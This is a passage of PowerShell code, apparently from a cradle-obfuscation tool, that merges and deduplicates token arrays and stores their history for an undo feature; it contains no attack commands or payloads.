        # Create temporary copy of $Script:TokenArray so we can properly merge unique values from $Script:TokenArray and $TokensUpdatedThisIteration.
        $TokenArrayCopy = $Script:TokenArray
        $Script:TokenArray = @()
        ForEach($Token in $TokenArrayCopy)
        {
            If(!($TokenArrayNames -Contains $Token[0]))
            {
                $Script:TokenArray += , $Token
            }
        }

        # Deduplicate the array of tokens returned from Out-Cradle.
        # To do this we will iterate $TokensUpdatedThisIteration in reverse and discard future instances of any duplicates.
        $TokensUpdated = @()
        $TokenNameList = @()
        For($i=$TokensUpdatedThisIteration.Count-1; $i -ge 0; $i--)
        {
            $Token      = $TokensUpdatedThisIteration[$i]
            $TokenName  = $Token[0]
            $TokenValue = $Token[1]

            If(!($TokenNameList -Contains $TokenName))
            {
                $TokenNameList += $TokenName
                $TokensUpdated += , $Token
            }
        }

        # Now that we have a properly de-duped $TokensUpdated array we will reverse the order again and add each token to $Script:TokenArray.
        $Script:TokenArray = @()
        For($i=$TokensUpdated.Count-1; $i -ge 0; $i--)
        {
            $Token = $TokensUpdated[$i]
            $Script:TokenArray += , $Token
        }
            
        # Store each instance of the entire $Script:TokenArray into $Script:TokenArrayHistory for proper UNDO functionality.
        $Script:TokenArrayHistory += , $Script:TokenArray
    }

    Return $CradleResultArray
}
